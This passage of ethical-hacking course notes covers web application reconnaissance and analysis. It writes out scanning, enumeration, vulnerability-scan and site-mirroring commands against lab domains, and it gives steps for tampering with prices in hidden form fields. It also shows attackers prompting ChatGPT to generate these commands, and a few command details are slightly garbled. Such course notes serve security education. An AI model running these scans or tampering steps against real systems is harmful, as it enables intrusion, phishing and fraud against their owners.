					- DNS Records (www.nslookup.io)
					- Domain Dossier (centralops.net)
					- DNSdumpster.com (dnsdumpster.com)
			- Banner Grabbing:
				- Banner grabbing is a footprinting technique used by hackers to obtain sensitive information about a target system. An attacker establishes a connection with the target and sends a pseudo-request. In response, the target returns a banner message containing details that can aid further penetration.
				- Through banner grabbing, attackers can identify the name and version of a server, operating system, or application. By analyzing the server's response headers, they determine the make, model, and version of the web server software. This information allows them to select appropriate exploits from vulnerability databases to attack the web server and its applications.
				- Using Telnet to Establish Connection and Retrieve Banner Information:
					- The attacker enters the command telnet moviescope.com 80 in the command prompt to establish a Telnet connection with the target machine.
					- Note: The attacker can specify either the target machine’s IP address or the website’s URL. If an IP address is used, the banner information of the target machine is retrieved. If a URL is entered, the banner information of the web server hosting the website is obtained.
					- Syntax: telnet <domain/IP> 80
					- After establishing the connection, the prompt does not display any immediate information.
					- The attacker then presses the Esc key, triggering the banner message, which reveals information about the target server along with other miscellaneous details. This information helps attackers identify vulnerabilities and exploit the target web server and its applications.
				- Grabbing Banners from SSL Services:
					- Tools such as Telnet and Netcat can retrieve banners from web servers over an HTTP connection. However, they cannot be used to grab banners over an SSL connection using the same methods. Instead, attackers use tools like OpenSSL to extract banner information from web servers over an encrypted (HTTPS/SSL) connection.
					- Steps to Grab Banners Over an SSL Connection:
						- Install OpenSSL: OpenSSL is a cryptographic toolkit that implements Secure Sockets Layer (SSL) and Transport Layer Security (TLS) network protocols, along with related cryptographic standards. It can be downloaded from OpenSSL’s official website.
						- Navigate to OpenSSL in the terminal and Run the following command: s_client –host <target website> -port 443
					- This method allows attackers to retrieve banner information from web servers running SSL/TLS encryption, helping them identify potential vulnerabilities.
				- Banner Grabbing Tools:
					- Telnet (github.com)
					- Netcat (netcat.sourceforge.net)
					- ID Serve (www.grc.com)
					- Netcraft (www.netcraft.com)
		- Port and Service Discovery:
			- Footprinting the web infrastructure provides valuable data about the services offered, including data exchange and encryption, transmission paths, and deployed protocols. Scanning the target web server helps identify commonly used ports and their associated services. Once these services are discovered, attackers may attempt to exploit them, compromising the web infrastructure that supports the application. The identified services serve as potential attack vectors for web application hacking.
			- Port Scanning: Port scanning is the process of examining system ports to identify open ones. It involves attempting connections to specific TCP or UDP ports to determine which services are running on the server. If attackers find an open but unused port, they may exploit it to gain unauthorized access to the system.
			- Service Discovery: Attackers can analyze the services running on web servers to determine whether they can be exploited as attack paths for hacking a web application. This process also reveals crucial web application details, such as: Storage locations, Information about machines running the services, Network usage and protocols involved.
			- Port Scanning and Service Discovery Tools:
				- Nmap (nmap.org):
					- Nmap is a multi-platform, multi-purpose tool used for scanning ports, identifying services, and detecting operating systems. It is widely used for network discovery and security auditing.
					- Uses: Network inventory management, Monitoring host or service uptime, Managing service upgrade schedules.
				- NetScanTools Pro (www.netscantools.com)
				- Advanced Port Scanner (www.advanced-port-scanner.com)
				- Open Port Scanner (www.solarwinds.com)
				- Port Scanner (www.whatismyip.com)
		- Server Identification:
			- Local Identity: Details such as the server's physical location and the Origin-Host.
			- Local Addresses: The local IP addresses used by the server for sending Diameter Capability Exchange Messages (CER/CEA). These messages include the server identity, capabilities, protocol version number, and supported Diameter applications.
			- Self-Names: This field lists all the realms that the server considers local. The server treats requests sent to these realms as no-realm requests.
		- Web Application Firewalls and Proxies Detection:
			- When footprinting a web infrastructure, attackers must identify the web application firewall (WAF) and proxy settings of the target site to understand the security measures in place.
			- Detecting Proxies:
				- Some organizations use proxy servers in front of their web servers to obscure their actual IP addresses, making them untraceable. When attackers attempt to determine the target’s IP address—hidden behind a proxy—footprinting techniques will typically reveal the proxy’s IP address instead of the legitimate server address.
				- To determine whether a target site is routing requests through a proxy server, attackers look for specific headers in the response. Proxy servers generally add unique headers in the response field. One method attackers use to identify a proxy is by executing the TRACE command, which sends a request to the web server and asks it to return the request. Attackers insert the TRACE command into an HTTP/1.1 request.
				- If the web server is behind a proxy, the proxy modifies the request (by adding headers) before forwarding it to the target web server. When the web server returns the request to the attacker’s machine, the attacker can compare the original request with the modified response to analyze any changes introduced by the proxy server.
			- Detecting Web Application Firewalls:
				- Web Application Firewalls (WAFs) are security devices deployed between the client and the web server. Similar to Intrusion Prevention Systems (IPS), WAFs protect web applications from a wide range of attacks by monitoring and filtering web traffic, blocking malicious requests, and safeguarding sensitive data.
				- Attackers use various techniques to detect WAFs within a web infrastructure. One method is by analyzing cookies, as some WAFs inject their own cookies during client-server communication. Attackers inspect the HTTP request cookies to check for signs of a WAF.
				- Another common technique involves examining HTTP headers. Since most WAFs modify HTTP headers, differences in server responses can indicate the presence of a firewall. By sending specific requests to the web server and analyzing the responses, attackers can determine whether a WAF is in place.
				- WAF Detection Tools:
					- WAFW00F: WAFW00F help identify and fingerprint WAFs protecting a website. WAFW00F detects a WAF on any domain by analyzing: Cookies, Server cloaking, HTTP response codes, Drop actions, Pre-configured rules.
					- WhatWaf (github.com)
					- Nmap (nmap.org)
					- Web Application Firewall Detector (pentest-tools.com)
					- SHIELDFY Web Application Firewall Detector (github.com)
					- Advanced Web application firewall detection (www.nmmapper.com)
				- WAF Detection with AI:
					- With the aid of AI, they can efficiently detect web application firewalls (WAFs) and quickly determine if a target URL is protected, allowing them to tailor their attack strategies accordingly. Nmap and WAFW00F are two commonly used tools for identifying WAF protection on a target website. These tools analyze network responses and HTTP headers to detect the presence of a firewall, helping attackers gather intelligence on the security measures in place.
		- Hidden Content Discovery:
			- Hidden content and functionality that are not accessible from the main visible interface can be discovered and exploited to manipulate user privileges within an application. This allows an attacker to retrieve backup copies of live files, configuration files, log files containing sensitive data, backup archives with snapshots of files within the web root, and new functionality that is not yet linked to the main application.
			- Methods to Discover Hidden Content:
				- Web Spidering/Crawling:
					- A web spider (also known as a web crawler or web robot) is a program or automated script that systematically browses websites to collect specific information, such as employee names and email addresses. Web spiders/crawlers automatically discover hidden content and functionality by parsing HTML forms and analyzing client-side JavaScript requests and responses. Attackers use the gathered information for footprinting and social engineering attacks.
					- However, web spidering may be ineffective if the target website has a robots.txt file in its root directory that restricts crawling. Despite this, attackers can still uncover files and web pages by providing a URL to the web spider, which then sends numerous requests to the target website and analyzes the HTML code of all received responses to identify additional links. If new links are found, they are added to the target list, and the spider continues the process of crawling and analysis. This technique helps attackers detect exploitable web attack surfaces and locate directories, web pages, and files that make up the target website.
					- Web Spidering/Crawling Tools:
						- OWASP Zed Attack Proxy (ZAP) (www.zaproxy.org):
							- OWASP Zed Attack Proxy (ZAP) is an integrated penetration testing tool used to identify vulnerabilities in web applications. It provides automated scanners and a suite of tools for manual security testing. Attackers use OWASP ZAP for web spidering and crawling to uncover hidden content and functionality in a target web application.
						- Web Data Extractor Pro (webextractor.com)
						- Burp Suite (portswigger.net)
						- WebScarab (owasp.org)
						- Mozenda Agent Builder (www.mozenda.com)
						- Octoparse (www.octoparse.com)
						- Giant Web Crawl (80legs.com)
				- User-Directed Spidering:
					- In some cases, attackers use a more advanced approach instead of relying solely on automated tools. They navigate the target website manually using standard web browsers to explore all available functionalities. While doing so, they monitor and analyze the incoming and outgoing website traffic using tools that combine web spidering and intercepting proxy features.
					- These tools create a comprehensive map of the web application by tracking all visited URLs and analyzing the application's responses. Any newly discovered content and functionalities are then added to the map. Attackers use tools such as Burp Suite and WebScarab for user-directed spidering, as these tools integrate web spidering and traffic interception capabilities, allowing them to monitor and analyze the target website’s activity effectively.
		- Load Balancer Detection:
			- Attackers can identify load balancers used by a target organization along with their real IP addresses to determine which servers are exposed to the Internet. Organizations deploy load balancers to distribute traffic across multiple servers, enhancing the scalability, reliability, and performance of their web application
			- In general, there are two types of load balancers:
				- DNS Load Balancers (Layer 4 Load Balancers): Operate at the transport layer, distributing traffic based on IP addresses and ports.
				- HTTP Load Balancers (Layer 7 Load Balancers): Operate at the application layer, making routing decisions based on HTTP headers, URLs, or cookies.
			- Attackers use various tools, such as dig and Load Balancing Detector (lbd), to detect load balancers and uncover real IP addresses. For instance, if a single hostname resolves to multiple IP addresses, it indicates that the target organization is using a load balancer.
			- Methods to Detect Load Balancers:
				- Using the host command:
					- The host command can be used to check whether a domain resolves to multiple IP addresses: host <target_domain>
				- Using the dig command:
					- The dig command provides more detailed results than the host command. Run the following command to check if a domain resolves to multiple IP addresses: dig <target_domain>
				- Using Load Balancing Detector (lbd):
					- The lbd (Load Balancing Detector) tool detects whether a given domain uses DNS and/or HTTP load balancing. It examines differences in responses, such as variations in the Server: and Date: headers, to identify load balancers.
					- Use the following command to detect load balancers in a target web application: lbd <target_domain>
			- Detecting Load Balancers Using AI:
				- Attackers can leverage AI-powered technologies to enhance and automate network scanning tasks. With AI, attackers can efficiently detect load balancers and determine whether a target domain is using load balancing. This information can provide valuable insights for planning and executing attacks. After identifying the real IP addresses behind the load balancers, attackers can launch further attacks against the target organization.
				- For example, an attacker could use an AI model, such as ChatGPT, to generate commands for detecting load balancers by providing a prompt like: "Use a load balancing detector on the target domain yahoo.com."
				- This prompt could generate the following command: lbd yahoo.com
				- This command automates the detection of load balancing on the target domain (yahoo.com) using the Load Balancing Detector (lbd) tool. The lbd tool is specifically designed to detect load balancing by analyzing DNS records and response headers.
		- Detecting Web Application Technologies:
			- Before launching an attack, attackers often attempt to identify the underlying technologies used to build a web application. This process, typically conducted during the reconnaissance phase, helps attackers understand the attack surface and pinpoint potential vulnerabilities that could be exploited in later stages.
			- Tools used to detect Web Application Technologies:
				- Wappalyzer (www.wappalyzer.com): Attackers use Wappalyzer to identify a website’s technology stack, including the content management system (CMS), e-commerce platform, payment processors, and even company and contact details. The tool is available as an online service and a browser extension.
				- BuiltWith (builtwith.com): BuiltWith helps attackers analyze the technology stack of a website, revealing details about server software, CMS, frameworks, analytics tools, advertising networks, programming languages, and more. It works by analyzing web page elements such as HTML, scripts, and server headers to identify the technologies in use.
		- WebSockets Enumeration:
			- During the footprinting phase of web infrastructure reconnaissance, attackers attempt to enumerate WebSockets on a target site to identify active WebSocket servers. Tools such as STEWS (Security Testing and Enumeration of WebSockets) assist attackers in this process.
			- STEWS (github.com):
				- STEWS is a suite of tools designed for testing WebSockets. It enables attackers to:
					- Discover WebSocket endpoints
					- Fingerprint the server running on an endpoint
					- Identify known vulnerabilities in WebSocket implementations
				- Command to Perform WebSocket Enumeration: python3 STEWS-fingerprint.py -l -k -u <Target_URL>
	- Analyze Web Applications:
		- After attempting various attacks on a vulnerable web server, attackers may shift their focus to the web application itself. To exploit it, they first analyze the application to identify vulnerabilities. Even a single flaw can be enough to compromise security if the right attack is executed. This section explains how attackers discover and exploit vulnerabilities in web applications.
		- By analyzing a target web application, attackers can reduce its “attack surface.” They begin by gathering basic knowledge of the application, then assess its functionality and technologies to identify exposed attack surfaces.
		- Attackers typically extract the details from a target website. By gathering and analyzing this information, attackers can pinpoint weaknesses and craft targeted exploits against a web application.
		- Information Gathered from Web Application Analysis:
			- Software and version: Off-the-shelf web applications often reveal the software and version in use.
			- Operating system: The OS running the web server can often be determined.
			- Subdirectories and parameters: By tracking URLs while browsing, attackers can identify subdirectories and parameters.
			- Filenames, paths, database fields, and queries: Analyzing query components may expose opportunities for SQL injection.
			- Scripting platform: File extensions like .php, .asp, or .jsp reveal the scripting language used.
			- Technologies used: URL structures can indicate whether the website is built with .NET, J2EE, PHP, etc.
			- Contact and CMS details: Contact pages often list admin or support personnel, including names, phone numbers, and email addresses, which can be exploited for social engineering. CMS software may rewrite URLs to hide script file extensions, but attackers can still determine the underlying platform with further effort.
			- SSL certificate details: Attackers can view security certificate information, including the issuer, expiration date, and encryption strength.
			- Cookies: Analyzing cookies helps attackers understand user sessions, preferences, and tracking mechanisms.
			- Error messages: Server error messages may reveal details about file paths, technologies, or configurations.
			- Publicly accessible files: Attackers can access unprotected files that may contain sensitive data, such as configuration files, backups, or logs.
		- Techniques for Analyzing Web Applications:
			- Identifying Entry Points for User Input:
				- The first step in web application analysis is locating entry points where user input is accepted, as these can serve as gateways for attacks. Common entry points include:
				- Front-end web applications that intercept HTTP requests
				- User interfaces on web pages
				- Service interfaces provided by web services
				- Serviced components
				- .NET Remoting components
				- Attackers review generated HTTP requests to pinpoint user input entry points.
			- Identifying Server-Side Technologies:
				- Server-side technologies process dynamic web page requests and execute scripts on the server. Common technologies include: ASP, ASP.NET, ColdFusion, JavaServer Pages (JSP), PHP, Python, Ruby on Rails.
				- Attackers use fingerprinting techniques, such as HTTP fingerprinting, to determine which technologies are active on a server.
			- Identifying Server-Side Functionality:
				- Server-side functionality refers to the execution of programs on the server to generate dynamic content for users. Scripts running on the server are not visible to the user, but attackers can analyze application behavior to infer server-side logic.
			- Identifying Files and Directories:
				- Misconfigurations in web server hosting may expose critical files and directories online. Attackers use automated tools like Gobuster to detect exposed files and directories, which may contain sensitive information.
			- Identifying Web Application Vulnerabilities:
				- Poor coding practices during development can leave security flaws that attackers exploit. Identifying these vulnerabilities helps attackers determine which attack vectors to use.
			- Mapping the Attack Surface:
				- Attackers map out the web application’s attack surface to identify and target specific vulnerabilities. By analyzing exposed components and their weaknesses, they refine their attack strategies.
		- Techniques for Gathering Information in Web Application Analysis:
			- Extracting Website Links:
				- Extracting website links is a crucial aspect of website footprinting, where an attacker analyzes a target website to identify its internal and external links. Using this information, an attacker can determine the applications, web technologies, and other related websites associated with the target. Additionally, extracting links can reveal important connections and provide URLs of other resources such as JavaScript and CSS files. This information helps attackers identify vulnerabilities in the target website and exploit the web application.
				- Attackers can use various online tools and services, such as Octoparse, Netpeak Spider, and Link Extractor, to extract linked images, scripts, iframes, and URLs from the target website. These tools can also help extract backlinks to the target website, providing valuable insights for further exploitation.
				- Octoparse (Source): Octoparse offers automatic data extraction, allowing users to scrape web data quickly without coding. It converts web pages into structured data. As shown in the screenshot, attackers use Octoparse to capture webpage content such as text, links, image URLs, and HTML code.
			- Gathering Wordlist from the Target Website:
				- The words present on a target website can reveal critical information that helps attackers in further exploitation. Attackers often collect email addresses associated with the target organization using search engines, social networking sites, web spidering tools, and more. Once they obtain email addresses, they extract a list of words from the target website. This information can be used to conduct brute-force attacks against the target organization.
				- The CeWL tool is commonly used to gather a list of words from a target website to facilitate brute-force attacks on the email addresses obtained. Commands for Running the CeWL Tool - Displays various options that can be used to extract a list of words from the target website: cewl https://www.certifiedhacker.com
			- Extracting Metadata from Public Documents:
				- Valuable information may be available on a target organization’s website in the form of PDF documents, Microsoft Word files, and other file formats. Attackers can extract metadata and hidden details from these documents to gather intelligence. This metadata often includes crucial information such as the document’s title, description, keywords, creation/modification dates, usernames, and email addresses of employees.
				- Cybercriminals can exploit this data to conduct malicious activities against the target organization. For example, they may use extracted usernames and email addresses for brute-force attacks on authentication systems or launch social engineering campaigns to distribute malware, potentially compromising the organization's security.
				- Metadata Extraction Tools:
					- Several tools can automate the process of extracting metadata, providing insights such as usernames, operating systems (which can be exploited based on OS-specific vulnerabilities), email addresses (potentially useful for phishing attacks), software details (including version and type), server information, document creation/modification dates, and website authors.
					- ExifTool (exiftool.org): ExifTool is a cross-platform Perl library and command-line application designed for reading, writing, and editing metadata in files. It supports a wide range of metadata formats, including EXIF, HTML, GPS, IPTC, XMP, and JFIF. The tool also enables metadata transfer between different file formats and can extract embedded images such as thumbnails, preview images, and high-resolution JPEGs from RAW files.
					- Other metadata extraction tools include Web Data Extractor Pro and Metagoofil, which automate the retrieval of critical information that may be exploited for reconnaissance and cyberattacks.
			- Monitoring Web Pages for Updates and Changes:
				- Attackers monitor target websites to detect updates and modifications. This allows them to track changes in login pages, extract password-protected content, monitor software version and driver updates, and retrieve images from modified web pages. By analyzing these changes, attackers can identify underlying vulnerabilities in the target website and exploit them to compromise web applications.
				- Web Page Monitoring Tools:
					- Various tools can automatically detect website updates and notify users via email or SMS. Some commonly used tools include WebSite-Watcher, Visualping, and Follow That Page.
					- WebSite-Watcher (www.aignes.com): WebSite-Watcher is a tool designed to track website updates and automatically detect changes. It saves the last two versions of a webpage for comparison and alerting purposes. Attackers may misuse WebSite-Watcher to extract and compare older and newer versions of a target website's pages, helping them identify security gaps that could be exploited.
			- Searching for Contact Information, Email Addresses, and Phone Numbers on a Company Website:
				- Attackers often search a target company’s website to gather valuable information. Organizations typically use their websites to share details about their services, products, and contact information. However, attackers can exploit this publicly available data to conduct further attacks on the company.
				- Examples of information that attackers may look for include:
					- Company contact names, phone numbers, and email addresses
					- Company locations and branch offices
					- Partner and affiliate details
					- News and press releases
					- Links to external websites
					- Information on products, projects, and services
				- By analyzing this data, attackers can craft targeted phishing campaigns, conduct social engineering attacks, or gather intelligence for further exploitation.
			- Searching for Web Page Posting Patterns and Revision Numbers:
				- Copyright is a legal mechanism that grants the creator of an original work exclusive rights to its use and distribution. To prevent unauthorized access and distribution of their content, most organizations include copyright notices on their published materials.
				- A typical copyright notice includes:
					- The copyright symbol (©)
					- The year of creation
					- The author’s name
					- A rights statement
				- Attackers can search for copyright notices on the web and analyze this information to gather insights about the target organization. Additionally, they may look for revision numbers of documents and products. A revision number is a unique identifier assigned to different versions of a document, often embedded within company files.
				- By searching for and tracking these revision numbers and document identifiers online, attackers can gain access to sensitive information, which may help them launch further attacks against the target organization.
			- Monitoring Website Traffic of the Target Company:
				- Attackers can monitor a target company’s website traffic using tools such as Web-Stat, Rank Tracker, and TeamViewer to gather valuable information. These tools help collect insights about the target’s customer base, enabling attackers to disguise themselves as customers and launch social engineering attacks.
				- The collected information includes:
					- Total Visitors: Tools like Clicky (clicky.com) track the total number of visitors browsing the target website.
					- Page Views: Tools like Opentracker (www.opentracker.net) monitor the total number of pages viewed by users, along with timestamps and user status on a specific web page (whether the page is still active or closed).
					- Bounce Rate: Tools like Google Analytics (analytics.google.com) measure the bounce rate of the target company’s website.
					- Live Visitors Map: Tools like Web-Stat (www.web-stat.com) track the geographical locations of users visiting the company’s website.
					- Site Ranking: Tools like Rank Tracker (www.ranktracker.com) track a company’s search engine ranking on the web.
					- Audience Geography: Tools like Rank Tracker provide insights into a company’s customer distribution across different geographic regions.
					- Visitor Tracking and Conversion Rates: Tools like Dashly (www.dashly.io) track website visitors and measure conversion rates.
		- Website Mirroring:
			- Website mirroring is the process of creating a replica or clone of an original website. Attackers can duplicate websites using mirroring tools such as HTTrack Web Site Copier and Cyotek WebCopy. These tools download a website to a local directory and recursively build all its directories, including HTML files, images, flash content, videos, and other files, from the web server onto another computer.
			- Benefits of Website Mirroring:
				- Useful for offline website browsing.
				- Allows attackers to spend more time analyzing the website for vulnerabilities and loopholes.
				- Helps in discovering the directory structure and extracting valuable information from the mirrored copy without making multiple requests to the web server.
			- Attackers can leverage this information to execute various web application attacks against the target organization’s website.
			- Website Mirroring Tool: HTTrack Web Site Copier (www.httrack.com):
				- HTTrack is an offline browser utility that downloads a website from the Internet to a local directory, replicating all directories, including HTML files, images, and other resources, from the web server onto another computer.
				- Attackers use HTTrack to mirror the entire website of a target organization, store it on their local system, and browse it offline to identify potential exploits and vulnerabilities.
			- Website Mirroring with AI:
				- With the aid of AI, attackers can easily perform website mirroring on a target website. For example, an attacker can use ChatGPT to generate the necessary command by providing an appropriate prompt, such as:
				- Prompt: "Mirror the target website certifiedhacker.com"
					- wget --mirror --convert-links --adjust-extension --page-requisites --no-parent http://certifiedhacker.com
				- Prompt: "Mirror the target website https://certifiedhacker.com with HTTrack on desktop."
					- httrack https://certifiedhacker.com mirror
					- This command automates the process of mirroring the target website using HTTrack, allowing attackers to create convincing phishing websites or gather sensitive information for malicious purposes.
		- Identifying Entry Points for User Input:
			- Web application input fields serve as potential gateways for attackers to launch various types of injection attacks. If these input fields are vulnerable, gaining access to the application becomes significantly easier.
			- During web application analysis, attackers attempt to identify entry points for user input to understand how the application accepts and processes data. They examine elements such as: URLs, HTTP headers, Query string parameters, POST data, Cookies.
			- Additionally, attackers look for HTTP header parameters that can be processed as user inputs, including: User-Agent, Referer, Accept, Accept-Language, Host.
			- They also analyze URL encoding techniques and encryption measures, such as SSL, implemented to secure web traffic. By identifying weaknesses in the input handling mechanisms, attackers can exploit vulnerabilities to gain unauthorized access to the web application.
			- Tools for Web Application Analysis:
				- Burp Suite (portswigger.net)
				- WebScarab (owasp.org)
				- OWASP Zed Attack Proxy (www.zaproxy.org)
				- httprint (www.net-square.com)
		- Identifying Server-Side Technologies:
			- Perform detailed server fingerprinting and analyze HTTP headers and HTML source code to identify server-side technologies.
			- Examine URLs for file extensions, directories, and other identifying information.
			- Analyze error page messages for technology-specific clues.
			- Inspect session tokens to determine the underlying server technology:
				- JSESSIONID – Java
				- ASPSESSIONID – IIS Server
				- ASP.NET_SessionId – ASP.NET
				- PHPSESSID – PHP
			- Use tools such as httprint and WhatWeb to identify server-side technologies.
				- httprint (net-square.com):
					- httprint is a web server fingerprinting tool that identifies web servers based on their characteristics, even if server banner strings are obfuscated using tools like mod_security or server mask.
					- Key Features:
						- Accurately detects web servers despite modified banners.
						- Identifies web-enabled devices without server banners, such as wireless access points, routers, switches, and cable modems.
						- Uses text signature strings, allowing easy customization by adding new signatures to its database.
				- WhatWeb (github.com):
					- WhatWeb scans and identifies web technologies, including: Content management systems (CMS), Blogging platforms, Analytics packages, JavaScript libraries, Web servers, Embedded devices
					- Key Features:
						- Over 1,800 plugins for detecting different technologies.
						- Identifies version numbers, email addresses, account IDs, SQL errors, and web framework modules.
			- Identifying Server-Side Technologies Using AI:
				- With the aid of AI, attackers can effortlessly automate website footprinting, enabling them to quickly gather valuable information about a target website. This information helps identify potential vulnerabilities and plan targeted attacks.
				- Prompt: "Launch WhatWeb on the target website www.moviescope.com to perform website footprinting. Run a verbose scan and print the output. Save the results in the file whatweb_log.txt."
				- Command: whatweb -v www.moviescope.com | tee whatweb_log.txt
				- This command automates the process of website footprinting on the target website www.moviescope.com using the WhatWeb tool. It allows attackers to gather detailed insights into the target's web technologies, frameworks, and potentially vulnerable components.
		- Identifying Server-Side Functionality:
			- After determining the server-side technologies, attackers attempt to identify the server-side functionality to uncover potential vulnerabilities. They analyze the page source, URLs, and query parameters, making educated guesses about the internal structure and behavior of the web application.
			- Tools for Identifying Server-Side Functionality:
				- GNU Wget (www.gnu.org): GNU Wget is a command-line utility used for retrieving files via HTTP, HTTPS, and FTP, the most commonly used Internet protocols. As a non-interactive tool, it can be executed from scripts, cron jobs, and terminals without requiring a graphical interface.
				- BlackWidow
				- cURL
			- Examining URLs for Clues:
				- SSL Certification: A secure website URL starts with https instead of http.
				- File Extensions: If a page contains a .aspx extension, the application is likely built using ASP.NET.
				- Query String Parameters: A parameter like showBY in the query string suggests that the application interacts with a database and retrieves data based on that value.
		- Identify Files and Directories:
			- Attackers use various techniques and tools to enumerate applications, hidden directories, and files of web applications hosted on web servers exposed to the Internet. They utilize tools such as Gobuster, URL Fuzzer, and the Nmap NSE script http-enum to identify files and directories of the target web application.
			- Gobuster:
				- Gobuster is a Go-based directory scanner that allows attackers to perform fast enumeration of hidden files and directories within a target web application. It is a command-line tool used to brute-force URIs on websites, discover DNS subdomains, and identify virtual host names on the target server.
				- Run the following command to retrieve file and directory names along with their status codes: gobuster dir -u <target URL> -w common.txt
				- Use the -s flag to filter results by specific status codes: gobuster dir -u <target URL> -w common.txt -s 200
			- Nmap:
				- Attackers use the Nmap NSE script http-enum to enumerate applications, directories, and files on web servers exposed to the Internet. This helps them identify critical security vulnerabilities in the target web application.
				- Run the following Nmap command to gather information about exposed files and directories on the target web server: nmap -sV --script=http-enum <target domain or IP address>
			- Identify Files and Directories with AI:
				- With the aid of AI, attackers can efficiently perform web content scanning, quickly enumerate directories and files on target URLs, and uncover hidden paths and potential vulnerabilities.
				- Example 1:
					- Scan the web content of www.moviescope.com using Dirb
					- Command: dirb http://www.moviescope.com
					- The Dirb tool is used to scan web content on the target URL www.moviescope.com.
				- Example 2: Scan the web content of www.moviescope.com using Gobuster
				- Command: gobuster dir -u http://www.moviescope.com -w /usr/share/wordlists/dirb/common.txt
				- The Gobuster command scans the target URL www.moviescope.com, using the wordlist /usr/share/wordlists/dirb/common.txt for directory brute-forcing.
		- Identify Web Application Vulnerabilities:
			- Attackers use various techniques to detect vulnerabilities in target web applications hosted on web servers. Their goal is to gain administrator-level access or retrieve sensitive information stored on the server. By scanning applications for vulnerabilities, they can identify attack surfaces and potential security weaknesses.
			- Comprehensive vulnerability scanning can expose security flaws in executables, binaries, and technologies used within a web application. Through this process, attackers can catalog vulnerabilities, prioritize them based on their threat levels, and exploit them when targeting an application.
			- To identify vulnerabilities in target web applications, attackers use tools such as Vega, WPScan, Arachni, and Uniscan.
			- Web Application Scanning Tools:
				- Vega (www.subgraph.com):
					- Vega is a free, open-source web security scanner and testing platform designed to assess the security of web applications. It helps identify and validate vulnerabilities such as:
						- SQL Injection
						- Cross-Site Scripting (XSS) (both reflected and stored)
						- Inadvertent disclosure of sensitive information
						- Blind SQL Injection
						- Remote File Inclusion
						- Shell Injection
					- Vega is written in Java, features a graphical user interface (GUI), and runs on Linux, macOS, and Windows. Additionally, it probes TLS/SSL security settings and identifies potential improvements to enhance server security.
				- WPScan Vulnerability Database (wpscan.com)
				- Codename SCNR (ecsypno.com)
				- AppSpider (www.rapid7.com)
				- Uniscan (github.com)
				- N-Stalker (www.nstalker.com)
			- Identify Web Application Vulnerabilities with AI:
				- With AI, they can efficiently perform website vulnerability scans, quickly identify security weaknesses, and plan targeted attacks.
				- Example 1: Perform a Vulnerability Scan on www.moviescope.com
					- Prompt: "Perform a vulnerability scan on the target URL www.moviescope.com."
					- Command: nikto -h www.moviescope.com
					- This command automates website vulnerability scanning using the Nikto tool to detect security flaws in www.moviescope.com.
				- Example #2: Perform a Vulnerability Scan on www.moviescope.com Using Nmap
					- Prompt: "Perform a vulnerability scan on the target URL www.moviescope.com using Nmap."
					- Command: nmap --script vuln www.moviescope.com
					- This command runs Nmap with the --script vuln option, which uses Nmap's built-in vulnerability scanning scripts to identify security weaknesses in www.moviescope.com.
				- Example 3: Install Sn1per and Scan www.moviescope.com for Web Vulnerabilities
					- Prompt: "Scan the target URL www.moviescope.com for web vulnerabilities, saving the results in scan.txt using the Sn1per tool."
					- Command: sniper -t www.moviescope.com -w scan3.txt
					- Runs Sn1per to scan www.moviescope.com for vulnerabilities and Saves the scan results in a file named scan.txt.
	- Bypass Client-Side Controls:
		- A web application often employs client-side controls to restrict user input when transmitting data via client components and to regulate the user’s interaction with their own client. Developers use techniques such as hidden HTML form fields and browser extensions to facilitate data transmission from the client to the server. However, web developers sometimes assume that data sent from the client is trustworthy, which can introduce vulnerabilities. Bypassing client-side controls typically involves attacks that exploit weaknesses in client-side validation mechanisms.
		- Web Application Attacks Used to Bypass Client-Side Controls:
			- Cross-Site Scripting (XSS)
			- Cross-Site Request Forgery (CSRF)
			- Parameter Tampering
			- HTTP Parameter Pollution
			- Input Field Manipulation
			- Hidden Field Manipulation
			- Client-Side Input Validation Bypass
			- JavaScript Injection
			- Cross-Origin Resource Sharing (CORS) Misconfiguration
			- Session Fixation
			- Browser Extension Attacks
			- Local Storage/Session Storage Manipulation
		- Attacking Hidden Form Fields:
			- E-commerce and retail web applications often use hidden HTML form fields to prevent users from viewing or modifying certain data fields, such as product names and prices, while allowing them to enter values for fields like quantity. The assumption is that users will only modify permitted fields before submitting data to the server. Developers mark these fields as hidden to restrict user modifications. However, in many cases, hidden fields store crucial information, such as product prices and discount rates, making them a target for attackers.
			- Steps to Attack Hidden Form Fields:
				- Identify a vulnerable web application.
				- Save the source code of the HTML page.
				- Locate the hidden form fields.
				- Modify the price values by editing the hidden field’s value.
				- Save the file and reload it in a browser.
				- Click the "Buy" button.
			- The request will be transmitted to the server with the modified price. Additionally, attackers can use proxy tools such as Burp Suite to intercept the request when the form is submitted and alter the price field to any value. Some attackers may even attempt to enter negative price values to trick the retail application into issuing refunds via credit card transactions.
		- Attacking Browser Extensions:
			- Data from web applications that use browser extension components can be captured using two primary methods:
			- Intercepting Traffic from Browser Extensions:
				- This method involves capturing and modifying requests and responses exchanged between the browser extension and the server. Tools such as Burp Suite can be used to intercept this data. However, certain limitations exist, such as data obfuscation, encryption, and secure data serialization, which may hinder interception and modification.
			- Decompiling Browser Extensions:
				- By decompiling a browser extension’s bytecode, attackers can analyze its source code and functionality in detail. This technique provides a significant advantage: it allows attackers to modify data in requests sent to the server, bypassing obfuscation or encryption mechanisms used for transmitted data.
				- Proxy tools like Burp Suite can also be used to intercept and manipulate web page component requests. When attempting to bypass client-side input validation implemented in a browser extension, if the extension submits validated data to the server transparently, an attacker can modify this data using an intercepting proxy—similar to how HTML form data can be manipulated.
		- Attacking Google Chrome Browser Extensions:
			- To compromise a web browser, attackers often trick victims into downloading a malicious file or visiting a malicious website, allowing them to infect the target browser. Once malware is installed, the browser may be manipulated to force users into enabling extensions and granting permissions, enabling attackers to exfiltrate sensitive data.
			- Exploiting the Chrome Sync Feature:
				- In the context of Google Chrome, attackers may target the Chrome Sync feature, which synchronizes browsing data across multiple devices. On a compromised browser, attackers can install fake or malicious extensions disguised as legitimate ones. These extensions can then be used to harvest stored browser information, including:
					- Autofill data
					- Bookmarks
					- Search history
					- Passwords
					- Browser settings
					- Other synchronized data
			- Data Collected by Attackers After Compromising Google Chrome
				- User Activity Data:
					- Preferred language
					- Recently visited websites
					- Most frequently accessed media files
					- Financial transactions on e-commerce sites
					- Contact list and details saved in the browser
					- Geo-location
					- Gyroscope and proximity sensor data when using GPS
				- User-Created Personal Information:
					- Usernames, passwords, financial account details, and contact information stored in the browser
					- Custom browser settings
					- User reactions to social media posts and uploaded files
					- Data from linked user accounts and devices
					- Device information, installed applications, and services used
				- Other Information:
					- Files, news, and data related to the user
					- Third-party websites and services, including e-commerce, social media, research, and business service providers
					- Tracking data: cookies, pixel tags, application cache, browser web storage, and server log files
		- Performing Source Code Review:
